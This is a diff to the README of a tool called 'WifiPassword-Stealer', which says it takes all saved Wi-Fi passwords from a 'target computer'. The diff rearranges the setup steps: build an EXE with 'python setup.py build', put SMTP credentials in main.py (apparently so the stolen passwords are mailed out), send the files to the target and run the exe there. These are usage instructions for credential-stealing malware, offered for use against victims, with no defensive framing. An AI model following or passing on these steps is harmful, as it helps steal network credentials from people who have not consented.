@@ -1,14 +1,6 @@
 # WifiPassword-Stealer
 Get All Registered Wifi Passwords from Target Computer.
 
-## EXE FILE
-
-```
-python setup.py build
-
-```
-Send the all files to your target in "dist" Folder.And run exe.
-
 ![github-small](/images/mail2.png)
 
 ## INSTALLATION
@@ -33,6 +25,14 @@ pip install glob
 •**Set your own SMTP USERNAME and SMTP PASSWORD on "main.py".**
 
 ![github-small](/images/pass.png)
+
+•**Create EXE with this command".**
+
+```
+python setup.py build
+
+```
+**Send the all files to your target in "dist" Folder.And run exe.**
 
 
 •**Run exe on Target Computer**
